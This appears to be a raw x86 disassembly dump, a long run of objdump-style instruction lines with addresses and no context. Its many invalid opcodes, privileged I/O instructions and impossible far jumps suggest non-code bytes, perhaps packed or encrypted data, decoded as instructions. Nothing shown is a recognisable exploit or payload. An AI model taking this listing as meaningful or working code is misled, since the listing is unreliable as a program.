  413b76:	and    al,BYTE PTR [edi]
  413b78:	add    BYTE PTR [eax],al
  413b7a:	push   esp
  413b7b:	push   ecx
  413b7c:	aaa    
  413b7d:	int    0x25
  413b7f:	aas    
  413b80:	mov    dl,0xac
  413b82:	sti    
  413b83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b84:	xchg   esi,eax
  413b85:	pop    edi
  413b86:	mov    ds:0x1dff9d55,al
  413b8b:	add    esp,DWORD PTR [edx+0x532663e6]
  413b91:	leave  
  413b92:	and    BYTE PTR [ebx],dl
  413b94:	hlt    
  413b95:	sub    dh,al
  413b97:	hlt    
  413b98:	mov    ecx,0x3b32aa81
  413b9d:	rol    DWORD PTR [edx],cl
  413b9f:	(bad)  
  413ba0:	test   al,0x83
  413ba2:	mov    cl,0x41
  413ba4:	push   ss
  413ba5:	(bad)  
  413ba7:	push   ss
  413ba8:	jno    0x413b7b
  413baa:	ds repz push esp
  413bad:	bound  esp,QWORD PTR [eax]
  413baf:	pushf  
  413bb0:	icebp  
  413bb1:	push   esp
  413bb2:	cli    
  413bb3:	ins    DWORD PTR es:[edi],dx
  413bb4:	data16 ins BYTE PTR es:[edi],dx
  413bb6:	lahf   
  413bb7:	enter  0xe585,0x5c
  413bbb:	xor    BYTE PTR [edx-0x22],bh
  413bbe:	imul   edi,DWORD PTR [ebp+0x362f9c8d],0xfff8231d
  413bc8:	lahf   
  413bc9:	xchg   esp,eax
  413bca:	sbb    esp,DWORD PTR [eax]
  413bcc:	mov    ecx,0xbbc3c8c2
  413bd1:	repz mov fs,ebx
  413bd4:	adc    DWORD PTR [eax-0x39ea23ea],eax
  413bda:	in     al,0xfa
  413bdc:	or     al,0xed
  413bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bdf:	gs in  eax,dx
  413be1:	and    edx,ecx
  413be3:	sub    esp,DWORD PTR [ecx-0x40b57ebb]
  413be9:	arpl   ax,si
  413beb:	adc    DWORD PTR [ebp+0x4c3064dd],eax
  413bf1:	xchg   DWORD PTR [ecx],edx
  413bf3:	mov    bh,0xe2
  413bf5:	iret   
  413bf6:	jmp    0x413bcb
  413bf8:	popf   
  413bf9:	xchg   esp,eax
  413bfa:	and    eax,0x333bf381
  413bff:	mov    esp,0x747cb665
  413c04:	ret    
  413c05:	cs int3 
  413c07:	push   ebp
  413c08:	jb     0x413c17
  413c0a:	sub    ecx,DWORD PTR [ecx-0x79]
  413c0d:	xchg   BYTE PTR [esi-0x45a731a],bh
  413c13:	cs pop ds
  413c15:	pop    ds
  413c16:	dec    ebp
  413c17:	cli    
  413c18:	iret   
  413c19:	inc    edx
  413c1a:	out    0xe2,eax
  413c1c:	push   ebp
  413c1d:	mov    ecx,esi
  413c1f:	in     eax,0x92
  413c21:	cmp    ebp,DWORD PTR [ecx-0x53]
  413c24:	(bad)  
  413c25:	ss das 
  413c27:	lods   eax,DWORD PTR ds:[esi]
  413c28:	adc    al,0xd3
  413c2a:	adc    BYTE PTR [edx-0x47],0x75
  413c2e:	push   0x24
  413c30:	push   ecx
  413c31:	outs   dx,DWORD PTR ds:[esi]
  413c32:	xchg   ebp,eax
  413c33:	mov    ebx,0x258c623b
  413c38:	pop    ebx
  413c39:	or     al,BYTE PTR [ecx-0x34a6d35e]
  413c3f:	xor    BYTE PTR [esi-0xd],ch
  413c42:	call   0xd8de:0xce7349dc
  413c49:	popa   
  413c4a:	mov    esi,0xa1351e4d
  413c4f:	cmp    esi,ebp
  413c51:	popa   
  413c52:	retf   
  413c53:	(bad)  
  413c54:	test   eax,0xae115ccb
  413c59:	stc    
  413c5a:	pop    esi
  413c5b:	push   es
  413c5c:	jb     0x413c98
  413c5e:	jp     0x413c4d
  413c60:	add    bh,BYTE PTR [eax-0x45]
  413c63:	mov    ds:0x744227b5,eax
  413c68:	sub    al,0x9e
  413c6a:	xchg   ch,dl
  413c6c:	test   BYTE PTR [ebx-0x1],cl
  413c6f:	adc    BYTE PTR [esi+0x10],al
  413c72:	lahf   
  413c73:	in     eax,0x9
  413c75:	pop    esp
  413c76:	fild   QWORD PTR [ecx]
  413c78:	(bad)  [eax+0xe958bac]
  413c7e:	call   0x6a50901b
  413c83:	popf   
  413c84:	add    al,0x9d
  413c86:	sub    BYTE PTR [ecx+ecx*2-0x50],bh
  413c8a:	xor    DWORD PTR [edi-0x74606a4b],edi
  413c90:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c92:	inc    ebx
  413c93:	mov    eax,ds:0x82b3edfe
  413c98:	or     edi,DWORD PTR [edi]
  413c9a:	aad    0x19
  413c9c:	out    dx,eax
  413c9d:	stos   BYTE PTR es:[edi],al
  413c9e:	out    dx,eax
  413c9f:	ins    DWORD PTR es:[edi],dx
  413ca0:	and    bh,BYTE PTR [edx+0x416dd594]
  413ca6:	mov    BYTE PTR [ebx+0x3b],bh
  413ca9:	test   ch,0xa7
  413cac:	js     0x413ce5
  413cae:	div    BYTE PTR [edx]
  413cb0:	repz in eax,dx
  413cb2:	retf   0x7b0c
  413cb5:	sbb    ah,BYTE PTR [eax]
  413cb7:	rol    BYTE PTR [edi-0xe],1
  413cba:	dec    ebx
  413cbb:	inc    esi
  413cbc:	sbb    edx,DWORD PTR [eax]
  413cbe:	or     al,0x32
  413cc0:	inc    ebx
  413cc1:	xchg   esi,eax
  413cc2:	push   edx
  413cc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cc4:	imul   esp,edi,0x4b
  413cc7:	sar    BYTE PTR [ebp+0x31658c41],0x82
  413cce:	fs cdq 
  413cd0:	sbb    eax,0x11467c48
  413cd5:	add    dl,BYTE PTR [ecx-0x46]
  413cd8:	lds    esp,FWORD PTR [esi]
  413cda:	test   esi,eax
  413cdc:	or     DWORD PTR [ecx],ebp
  413cde:	test   eax,0x5d6f3a4c
  413ce3:	mov    al,0xa9
  413ce5:	fiadd  WORD PTR [edi-0x2d]
  413ce8:	add    esi,esi
  413cea:	pop    ebp
  413ceb:	pop    ebp
  413cec:	ss or  esi,edi
  413cef:	xchg   BYTE PTR [ecx],cl
  413cf1:	mov    ebx,0xe1da2a6
  413cf6:	add    eax,0xe6067e98
  413cfb:	fisubr WORD PTR [ebp+0x826a5fd]
  413d01:	cmp    DWORD PTR [esi],edx
  413d03:	lods   al,BYTE PTR ds:[esi]
  413d04:	lds    edx,FWORD PTR [eax+ebp*4+0xd0fa851]
  413d0b:	xor    BYTE PTR [ebp+0x2403b0d0],0xf1
  413d12:	arpl   WORD PTR [ebx],bp
  413d14:	(bad)  
  413d16:	add    DWORD PTR [edi],ebp
  413d18:	fwait
  413d19:	sbb    edx,DWORD PTR [ebx+0x90cb6b3]
  413d1f:	dec    edx
  413d20:	xchg   ebp,eax
  413d21:	jb     0x413d31
  413d23:	xor    ebp,esp
  413d25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d26:	cmp    DWORD PTR [edi+esi*4+0xe],edx
  413d2a:	dec    BYTE PTR [edx+0x75ee7ec]
  413d30:	or     bh,BYTE PTR [ebx+0x574e42f2]
  413d36:	mov    dl,0x26
  413d38:	sahf   
  413d39:	push   ebx
  413d3a:	jge    0x413d0e
  413d3c:	in     al,0x74
  413d3e:	loopne 0x413d7c
  413d40:	push   eax
  413d41:	loope  0x413d4e
  413d43:	jl     0x413d89
  413d45:	sbb    dl,dh
  413d47:	out    dx,eax
  413d48:	retf   
  413d49:	mov    dh,bl
  413d4b:	mov    edi,0xbf5d8ca5
  413d50:	enter  0xf570,0xb7
  413d54:	mov    eax,0x3c595a50
  413d59:	add    al,0xb1
  413d5b:	lods   eax,DWORD PTR ds:[esi]
  413d5c:	adc    eax,0x9bab938
  413d61:	cli    
  413d62:	xor    eax,0xb6a3444b
  413d67:	call   edx
  413d69:	dec    esi
  413d6b:	aas    
  413d6c:	mov    DWORD PTR [edx+0x63f049bb],eax
  413d72:	jp     0x413d83
  413d74:	add    BYTE PTR [ebx+0x69],0xe5
  413d78:	dec    esp
  413d79:	shl    BYTE PTR [ecx],0x80
  413d7c:	and    bl,ah
  413d7e:	fidiv  WORD PTR [ebp-0x32c10952]
  413d84:	mov    ah,0xf4
  413d86:	dec    esp
  413d87:	lock sbb al,0x97
  413d8a:	xchg   esp,eax
  413d8b:	dec    edx
  413d8c:	fcom   QWORD PTR ds:0x7a3a656a
  413d92:	ret    
  413d93:	cwde   
  413d94:	bound  esp,QWORD PTR [edx]
  413d96:	(bad)  
  413d97:	push   edx
  413d98:	xchg   BYTE PTR [eax],ch
  413d9a:	les    eax,FWORD PTR [ecx]
  413d9c:	pop    ecx
  413d9d:	sahf   
  413d9e:	fnstcw WORD PTR [eax-0x4d808c3e]
  413da4:	imul   ecx,ebp,0xffffff82
  413da7:	ss clc 
  413da9:	fdiv   st(3),st
  413dab:	sub    DWORD PTR [ecx+0x486d17f0],edx
  413db1:	mov    ah,0x76
  413db3:	or     eax,0x3d7152b6
  413db8:	jb     0x413d8b
  413dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dbb:	mov    ch,0x9d
  413dbd:	addr16 jae 0x413da8
  413dc0:	xor    bl,bh
  413dc2:	dec    edi
  413dc3:	repz push eax
  413dc5:	(bad)  
  413dc6:	call   0xbc94:0x8f689b28
  413dcd:	aad    0x90
  413dcf:	in     eax,0xf1
  413dd1:	add    eax,0x6eb60ec9
  413dd6:	mov    ds:0x5d121067,eax
  413ddb:	inc    ebp
  413ddc:	ret    
  413ddd:	inc    ebx
  413dde:	dec    eax
  413ddf:	sub    eax,0x16f5ed25
  413de4:	push   esi
  413de5:	or     BYTE PTR [ebp+edi*8-0x17],0x75
  413dea:	jbe    0x413da1
  413dec:	fwait
  413ded:	stos   BYTE PTR es:[edi],al
  413dee:	pop    ds
  413def:	fmulp  st(4),st
  413df1:	nop
  413df2:	add    ecx,DWORD PTR [ebp-0x432a28d6]
  413df8:	mov    dl,0xe6
  413dfa:	jmp    0x9196d099
  413dff:	and    DWORD PTR [ecx],ebp
  413e01:	das    
  413e02:	ret    
  413e03:	mov    dl,0x4f
  413e05:	xor    dl,BYTE PTR [edx+0x74]
  413e08:	scas   al,BYTE PTR es:[edi]
  413e09:	pushf  
  413e0a:	in     al,0x99
  413e0c:	push   ecx
  413e0d:	add    esi,0xffffffb6
  413e10:	mov    esi,0x5c94fc72
  413e15:	sbb    ebx,esi
  413e17:	(bad)  
  413e18:	in     eax,0x52
  413e1a:	pop    ecx
  413e1b:	xchg   ebp,eax
  413e1c:	cld    
  413e1d:	loop   0x413e02
  413e1f:	jae    0x413dd6
  413e21:	stos   DWORD PTR es:[edi],eax
  413e22:	aas    
  413e23:	jle    0x413e70
  413e25:	jo     0x413e32
  413e27:	or     dh,ch
  413e29:	cmp    al,0xf5
  413e2b:	xor    al,0x12
  413e2d:	push   edx
  413e2e:	iret   
  413e2f:	inc    edx
  413e30:	aas    
  413e31:	or     DWORD PTR [esi+0x51345da8],edx
  413e37:	test   eax,0x299da8e0
  413e3c:	mov    esp,0x22b9d4fb
  413e41:	out    dx,al
  413e42:	dec    edx
  413e43:	sbb    al,0xdf
  413e45:	out    dx,al
  413e46:	cmp    eax,0xcfb23bbc
  413e4b:	add    bh,BYTE PTR [ecx-0x1e501bda]
  413e51:	lods   al,BYTE PTR ds:[esi]
  413e52:	xchg   BYTE PTR [edx-0x4],dh
  413e55:	push   ebp
  413e56:	dec    ebp
  413e57:	std    
  413e58:	retf   0x9a37
  413e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e5c:	ja     0x413e36
  413e5e:	jmp    0x961d80c2
  413e63:	jl     0x413df0
  413e65:	sub    DWORD PTR [edi+esi*2+0x54],0x11
  413e6a:	inc    ecx
  413e6b:	xor    al,0x1
  413e6d:	inc    ecx
  413e6e:	stos   DWORD PTR es:[edi],eax
  413e6f:	inc    ecx
  413e70:	mov    DWORD PTR [ecx+0x4c750e3e],esi
  413e76:	movhps QWORD PTR [eax+esi*8+0x1d895b9f],xmm1
  413e7e:	pop    ss
  413e7f:	push   ecx
  413e80:	pop    edi
  413e81:	imul   edx,DWORD PTR [ebp-0xa],0xd217b14b
  413e88:	xchg   esi,eax
  413e89:	pushf  
  413e8a:	xchg   esp,eax
  413e8b:	inc    edi
  413e8c:	daa    
  413e8d:	sub    al,0x84
  413e8f:	in     al,0x8b
  413e91:	inc    edx
  413e92:	adc    BYTE PTR [edi+0xf],bh
  413e95:	add    esi,DWORD PTR [ecx-0x7e06739e]
  413e9b:	dec    ebp
  413e9c:	mov    edx,0xb6f2c8b0
  413ea1:	mov    ebp,0x48ab6a40
  413ea6:	xchg   ecx,eax
  413ea7:	ficomp WORD PTR [ebx-0x75]
  413eaa:	inc    esi
  413eab:	(bad)  
  413eac:	mov    ebx,0xbbd865d4
  413eb1:	std    
  413eb2:	mov    eax,ds:0x97b6f80d
  413eb7:	lea    eax,[ecx+0x78]
  413eba:	xchg   esp,eax
  413ebb:	stos   DWORD PTR es:[edi],eax
  413ebc:	mov    dh,BYTE PTR [edi+0x6]
  413ebf:	dec    edx
  413ec0:	cdq    
  413ec1:	aam    0x16
  413ec3:	pop    ss
  413ec4:	je     0x413eeb
  413ec6:	inc    ecx
  413ec7:	push   ss
  413ec8:	mov    ds:0x9c1589ef,al
  413ecd:	mov    dl,0xad
  413ecf:	(bad)  
  413ed0:	cmp    bl,bl
  413ed2:	es (bad) 
  413ed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ed5:	and    al,0x12
  413ed7:	es fwait
  413ed9:	or     bh,dl
  413edb:	pop    ebx
  413edc:	stos   DWORD PTR es:[edi],eax
  413edd:	test   BYTE PTR gs:[ebp-0x7b6ab31b],dh
  413ee4:	bound  ebp,QWORD PTR [ebp-0x58]
  413ee7:	not    BYTE PTR [edi+0x1b]
  413eea:	mov    edx,fs
  413eec:	fist   DWORD PTR [edi+0x5862c176]
  413ef2:	sub    al,0xe9
  413ef4:	lods   al,BYTE PTR ds:[esi]
  413ef5:	jne    0x413f4d
  413ef7:	pusha  
  413ef8:	dec    esp
  413ef9:	xchg   esp,eax
  413efa:	fbstp  TBYTE PTR [ebx+0x49]
  413efd:	div    DWORD PTR [edx+ebx*4+0x3c]
  413f01:	inc    ecx
  413f03:	cld    
  413f04:	lahf   
  413f05:	imul   eax,DWORD PTR [esi+0x2fa62b84],0x51
  413f0c:	aad    0xea
  413f0e:	outs   dx,BYTE PTR ds:[esi]
  413f0f:	rol    DWORD PTR [edi],0x18
  413f12:	rol    edi,1
  413f14:	fidivr DWORD PTR [esi-0x36]
  413f17:	adc    DWORD PTR [ebx],ebx
  413f19:	cmc    
  413f1a:	sub    ch,BYTE PTR [edx+0x30]
  413f1d:	push   cs
  413f1e:	pop    eax
  413f1f:	xor    cl,BYTE PTR [esi]
  413f21:	cmp    ebp,eax
  413f23:	int3   
  413f24:	push   ds
  413f25:	cmp    al,0xdf
  413f27:	cvtps2pi mm7,QWORD PTR [ebp-0x54]
  413f2b:	sti    
  413f2c:	mov    ebx,0xe40e2538
  413f31:	lea    ebp,[edi]
  413f33:	pop    edx
  413f34:	call   0xbd8401c0
  413f39:	xor    DWORD PTR [ebx-0x6efe27bc],ebx
  413f3f:	mov    DWORD PTR [esi],esi
  413f41:	inc    ebp
  413f42:	iret   
  413f43:	push   ecx
  413f44:	sub    BYTE PTR [esi+0x21],ch
  413f47:	jmp    0x413fbb
  413f49:	sub    al,0x82
  413f4b:	ins    BYTE PTR es:[edi],dx
  413f4c:	out    dx,al
  413f4d:	out    0xd7,eax
  413f4f:	in     al,0x2
  413f51:	out    0xbf,al
  413f53:	pusha  
  413f54:	inc    ebx
  413f55:	pusha  
  413f56:	mov    ah,0xb
  413f58:	dec    edx
  413f59:	pop    ebx
  413f5a:	mov    esp,0x99cf33c7
  413f5f:	int3   
  413f60:	mov    edi,0x91bacb7e
  413f65:	fist   WORD PTR [ecx-0x16]
  413f68:	mov    eax,0xd0929cf0
  413f6d:	jl     0x413f5d
  413f6f:	rcr    BYTE PTR [edx+0x655c0af7],1
  413f75:	dec    eax
  413f76:	stos   DWORD PTR es:[edi],eax
  413f77:	daa    
  413f78:	fidivr WORD PTR [edx+ebp*1+0x6d600a05]
  413f7f:	mov    cl,0xa7
  413f81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f82:	je     0x413f8a
  413f84:	js     0x413f09
  413f86:	xor    eax,0xc76c65ad
  413f8b:	pop    ebx
  413f8c:	cld    
  413f8d:	sbb    edx,DWORD PTR [edx+0x1cccb6d5]
  413f93:	sub    edx,edi
  413f95:	push   edi
  413f96:	mov    cl,0x29
  413f98:	xor    al,0x58
  413f9a:	scas   al,BYTE PTR es:[edi]
  413f9b:	test   DWORD PTR [esi+0x4b791d47],0x8a68d93
  413fa5:	and    edx,DWORD PTR [ebp-0x7eeb34e3]
  413fab:	outs   dx,DWORD PTR ds:[esi]
  413fac:	les    ebx,FWORD PTR [eax+ebp*2]
  413faf:	or     esp,DWORD PTR [ebx+ebx*2-0x48ca134d]
  413fb6:	fadd   st,st(7)
  413fb8:	or     dl,BYTE PTR [esp+ebp*1]
  413fbb:	test   DWORD PTR [ebx-0x2b],edi
  413fbe:	bound  ebp,QWORD PTR ds:0xb16c1275
  413fc4:	jno    0x413f70
  413fc6:	repz mov eax,ds:0xacdf4dff
  413fcc:	adc    eax,0x19e2a1ca
  413fd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fd2:	fild   QWORD PTR [edi+ebx*1-0x5e94802c]
  413fd9:	mov    dl,0x60
  413fdb:	std    
  413fdc:	iret   
  413fdd:	or     eax,DWORD PTR [ecx-0x67]
  413fe0:	in     al,0xa4
  413fe2:	xchg   ebx,eax
  413fe3:	stc    
  413fe4:	cmp    al,0xb1
  413fe6:	and    al,ah
  413fe8:	ret    0xf721
  413feb:	inc    esp
  413fec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fed:	dec    ecx
  413fee:	std    
  413fef:	rep stos DWORD PTR es:[edi],eax
  413ff1:	std    
  413ff2:	lahf   
  413ff3:	or     DWORD PTR [ecx-0x46],esi
  413ff6:	dec    ebp
  413ff7:	pop    es
  413ff8:	mov    esi,0xe4428585
  413ffd:	jnp    0x413ff2
  413fff:	stos   DWORD PTR es:[di],eax
  414001:	adc    DWORD PTR [ebp+0x58fc7533],ecx
  414007:	inc    ebx
  414008:	sbb    eax,0xa7d10151
  41400d:	xor    BYTE PTR [eax],ch
  41400f:	sbb    edi,edi
  414011:	in     eax,dx
  414012:	jnp    0x41402b
  414014:	cdq    
  414015:	div    bh
  414017:	lds    edx,FWORD PTR [edi]
  414019:	call   0x82b6:0xcfb071d7
  414020:	lods   al,BYTE PTR ds:[esi]
  414021:	push   ss
  414022:	ret    0xeb11
  414025:	cld    
  414026:	xor    eax,0xbb8fab2c
  41402b:	(bad)  
  41402d:	adc    al,0xc2
  41402f:	imul   esp,DWORD PTR [esi+0x35dc9d9f],0x46
  414036:	(bad)  
  414037:	and    BYTE PTR [edi],ah
  414039:	adc    al,0x64
  41403b:	mov    esi,0xe874b1be
  414040:	stc    
  414041:	in     eax,dx
  414042:	or     eax,0xfec64343
  414047:	loop   0x414066
  414049:	sti    
  41404a:	sub    edx,ebx
  41404c:	add    BYTE PTR [edx],ah
  41404e:	lods   al,BYTE PTR es:[esi]
  414050:	and    DWORD PTR [eax+0x65],ecx
  414053:	loop   0x41404f
  414055:	cmp    ecx,DWORD PTR [esi+0x1f]
  414058:	jnp    0x4140c3
  41405a:	or     DWORD PTR [eax-0x54],ebx
  41405d:	out    0x8b,al
  41405f:	out    dx,al
  414060:	mov    ds:0xec43d0ea,eax
  414065:	iret   
  414066:	push   edx
  414067:	addr16 dec eax
  414069:	cmp    al,BYTE PTR [esi+0x69]
  41406c:	adc    eax,0xbfc5171
  414071:	bound  ecx,QWORD PTR [esp+eax*2]
  414074:	sbb    bh,BYTE PTR [edx]
  414076:	xor    al,0xf5
  414078:	icebp  
  414079:	es repnz in eax,0x3d
  41407d:	inc    ecx
  41407e:	bound  ebp,QWORD PTR [ecx+0x57]
  414081:	shr    BYTE PTR [ecx+0x29],0xbc
  414085:	sbb    edi,eax
  414087:	xchg   BYTE PTR [ebx+edi*2+0x37539b8a],dh
  41408e:	retf   
  41408f:	inc    ebp
  414090:	in     eax,dx
  414091:	xlat   BYTE PTR ds:[ebx]
  414092:	mov    edx,0xea9168a3
  414097:	in     al,dx
  414098:	and    eax,0xdeed8eb6
  41409d:	lods   eax,DWORD PTR ds:[esi]
  41409e:	pop    ss
  41409f:	sub    al,0x38
  4140a1:	repnz int 0x37
  4140a4:	inc    eax
  4140a5:	pop    ecx
  4140a6:	xchg   esp,eax
  4140a7:	out    0x6,al
  4140a9:	cwde   
  4140aa:	cli    
  4140ab:	adc    DWORD PTR [ecx],ebp
  4140ad:	stc    
  4140ae:	dec    ebx
  4140af:	dec    eax
  4140b0:	int3   
  4140b1:	or     al,0xfe
  4140b3:	int3   
  4140b4:	sub    ecx,DWORD PTR [eax+0x20b379aa]
  4140ba:	and    BYTE PTR [ebx-0x40],cl
  4140bd:	les    eax,FWORD PTR [ebp-0x45]
  4140c0:	sahf   
  4140c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140c3:	(bad)  
  4140c5:	push   ebp
  4140c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140c7:	je     0x4140cd
  4140c9:	xchg   ecx,eax
  4140ca:	dec    esp
  4140cb:	les    esi,FWORD PTR ss:[esi+ebp*4-0x3f0bf2dc]
  4140d3:	scas   eax,DWORD PTR es:[edi]
  4140d4:	jo     0x4140a6
  4140d6:	fidivr WORD PTR [edi-0x1d]
  4140d9:	daa    
  4140da:	sti    
  4140db:	div    DWORD PTR [ecx+0x43b75ecc]
  4140e1:	mov    edx,0xb709dceb
  4140e6:	push   es
  4140e7:	add    DWORD PTR [edi+0x50],0xffffffee
  4140eb:	xor    eax,0x63e8eca7
  4140f0:	mov    eax,0x35af3a
  4140f5:	aas    
  4140f6:	ja     0x4140f1
  4140f8:	xor    BYTE PTR ds:0xa7b81797,cl
  4140fe:	cmp    DWORD PTR [edx],edx
  414100:	retf   0xe938
  414103:	sub    bh,BYTE PTR [edx]
  414105:	inc    ecx
  414106:	int    0xc8
  414108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414109:	xchg   esp,eax
  41410a:	pusha  
  41410b:	in     eax,dx
  41410c:	mov    edx,0xb7eee0c6
  414111:	sub    eax,0xb4420beb
  414116:	xchg   ebp,eax
  414117:	jbe    0x41409d
  414119:	loopne 0x414136
  41411b:	shr    al,0xa1
  41411e:	(bad)  
  41411f:	push   ds
  414120:	or     DWORD PTR [eax],edx
  414122:	aas    
  414123:	call   0x36545164
  414128:	imul   edx,DWORD PTR [edi-0x5f],0x40
  41412c:	adc    ebx,DWORD PTR [ecx+0x4b9f8bcc]
  414132:	or     al,0xf0
  414134:	enter  0x7011,0x74
  414138:	fisttp QWORD PTR [esi-0x64]
  41413b:	popf   
  41413c:	sbb    BYTE PTR [edi+0x4f09817d],bh
  414142:	ret    0xf691
  414145:	adc    bh,dl
  414147:	xor    BYTE PTR [ecx],bh
  414149:	xor    eax,0x724cd451
  41414e:	fstp   DWORD PTR [esp+esi*1]
  414151:	mov    ebx,0xbc8235c3
  414156:	pop    edi
  414157:	xor    al,0xc8
  414159:	loope  0x4141c0
  41415b:	push   eax
  41415c:	and    BYTE PTR [eax+edx*1+0x5a],cl
  414160:	mov    eax,0x5b5980ac
  414165:	dec    edi
  414166:	rol    BYTE PTR [edx],0x96
  414169:	not    DWORD PTR [ecx+0x3b37fcf3]
  41416f:	cwde   
  414170:	ret    
  414171:	loope  0x41415a
  414173:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414174:	mov    edx,0x4cc2762d
  414179:	push   cs
  41417a:	add    BYTE PTR [esi+0xd20577f],0x51
  414181:	scas   eax,DWORD PTR es:[edi]
  414182:	sbb    DWORD PTR [edi+ebx*2+0x67],0x6e
  414187:	pop    ds
  414188:	ret    
  414189:	inc    ebx
  41418a:	mov    ah,0x72
  41418c:	mov    edx,DWORD PTR [edx-0x61d74d73]
  414192:	push   ds
  414193:	jl     0x4141b0
  414195:	jmp    0x8c0f:0x3b07499a
  41419c:	xchg   esp,eax
  41419d:	pop    edx
  41419e:	imul   ecx,DWORD PTR [edi],0x62
  4141a1:	inc    ebx
  4141a2:	imul   eax,eax,0xf6a8435c
  4141a8:	push   ds
  4141a9:	adc    al,0x43
  4141ab:	and    DWORD PTR [ecx+0x5c8ece3a],ebx
  4141b1:	cli    
  4141b2:	pop    esi
  4141b3:	int3   
  4141b4:	fwait
  4141b5:	dec    edx
  4141b6:	mov    bl,0x54
  4141b8:	jns    0x41413d
  4141ba:	lods   eax,DWORD PTR ss:[esi]
  4141bc:	mov    DWORD PTR [ebx],esp
  4141be:	inc    ebp
  4141bf:	fcmovnb st,st(2)
  4141c1:	lock pop edx
  4141c3:	(bad)  
  4141c4:	mov    ah,0x1a
  4141c6:	into   
  4141c7:	mov    ds:0xe6334b2d,eax
  4141cc:	int3   
  4141cd:	pop    ecx
  4141ce:	loope  0x414176
  4141d0:	mov    ebx,0xd87155fe
  4141d5:	ror    DWORD PTR [edx+0x343ab157],cl
  4141db:	xchg   edi,eax
  4141dc:	inc    ecx
  4141dd:	adc    esp,DWORD PTR [edx+0xe]
  4141e0:	push   es
  4141e1:	xchg   BYTE PTR [ebp+ebp*8+0x5849e220],dh
  4141e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141e9:	ja     0x4141cf
  4141eb:	xchg   ebx,eax
  4141ec:	cli    
  4141ed:	mov    gs,WORD PTR [esi+0x4b2410a4]
  4141f3:	daa    
  4141f4:	adc    ebp,DWORD PTR [eax]
  4141f6:	ins    DWORD PTR es:[edi],dx
  4141f7:	(bad)  
  4141f8:	xor    DWORD PTR [edi-0x6],edi
  4141fb:	test   BYTE PTR [ebx-0x74],al
  4141fe:	mov    ecx,ebx
  414200:	js     0x414189
  414202:	sahf   
  414203:	push   0x21520434
  414208:	out    dx,eax
  414209:	adc    ebp,DWORD PTR [esi+0x25]
  41420c:	push   esi
  41420d:	pop    ds
  41420e:	int    0xc0
  414210:	fidiv  DWORD PTR [ebx+0x1093a06a]
  414216:	pop    es
  414217:	sbb    al,0xf8
  414219:	push   ebx
  41421a:	or     DWORD PTR ds:0x1eb095b0,ecx
  414220:	pop    es
  414221:	sub    eax,0x6d3a21d6
  414226:	nop
  414227:	ds mov ah,0xf0
  41422a:	ja     0x41424e
  41422c:	cmp    BYTE PTR [ebp-0x60],al
  41422f:	loop   0x414201
  414231:	test   edi,0x9463dfe0
  414237:	xor    al,0xe3
  414239:	jg     0x41424b
  41423b:	xchg   ebp,eax
  41423c:	jns    0x41422c
  41423e:	or     ebp,ebx
  414240:	jns    0x4142a6
  414242:	popf   
  414243:	add    DWORD PTR [ecx-0x6cc4c9b7],0x77066ab3
  41424d:	cwde   
  41424e:	pop    esi
  41424f:	pop    eax
  414250:	mov    eax,0x1e32ae67
  414255:	cwde   
  414256:	push   esi
  414257:	leave  
  414258:	adc    BYTE PTR [ebx],ah
  41425a:	and    eax,0x7d
  41425d:	dec    ebp
  41425e:	cmp    eax,0x367a9208
  414263:	daa    
  414264:	out    dx,eax
  414265:	(bad)  
  414266:	jno    0x414245
  414268:	inc    ebx
  414269:	loop   0x4142da
  41426b:	imul   eax,DWORD PTR [ebx-0x71210c84],0xea54fd24
  414275:	sbb    al,0xad
  414277:	fisttp WORD PTR [ebx]
  414279:	cli    
  41427a:	cld    
  41427b:	lea    edi,[edx-0x432b1355]
  414281:	xor    eax,0xe703e0e5
  414286:	scas   eax,DWORD PTR es:[edi]
  414287:	or     edx,eax
  414289:	jne    0x4142e0
  41428b:	jge    0x41427d
  41428d:	repz jle 0x414266
  414290:	xchg   edx,eax
  414291:	out    0xb5,al
  414293:	js     0x414232
  414295:	mov    ebp,0x8eac4ee8
  41429a:	lock mov ebp,0x0
  4142a0:	add    BYTE PTR [eax],al
  4142a2:	and    BYTE PTR [edi-0x200729d],bl
  4142a8:	out    dx,al
  4142a9:	mov    edi,0x4100ab8e
  4142ae:	xor    eax,0x5d04c12e
  4142b3:	inc    ebp
  4142b4:	add    DWORD PTR [eax],eax
  4142b6:	and    al,BYTE PTR [edi]
  4142b8:	add    BYTE PTR [eax],al
  4142ba:	in     eax,dx
  4142bb:	sub    BYTE PTR [esi+0x70ee15e8],bl
  4142c1:	jle    0x4142e5
  4142c3:	adc    DWORD PTR [ebp+0x72],ebx
  4142c6:	jg     0x414307
  4142c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142c9:	xor    al,0xc0
  4142cb:	je     0x4142b9
  4142cd:	frstor [esp+esi*1-0x38087a1a]
  4142d4:	dec    edi
  4142d5:	sub    BYTE PTR [edx+0x4f82be7],0x5f
  4142dc:	xor    al,BYTE PTR [ecx]
  4142de:	mov    ah,0xa1
  4142e0:	pop    esp
  4142e1:	je     0x41426c
  4142e3:	or     BYTE PTR [esi],0x59
  4142e6:	fcmovu st,st(2)
  4142e8:	mov    ebx,0x9375882a
  4142ed:	push   esi
  4142ee:	popf   
  4142ef:	add    eax,0xed77c096
  4142f4:	or     al,0xe7
  4142f6:	xor    BYTE PTR [ebx+ecx*1+0x20],dl
  4142fa:	mov    ds:0x2e9d2d63,al
  4142ff:	push   edx
  414300:	cmc    
  414301:	push   ds
  414302:	add    eax,0x96440538
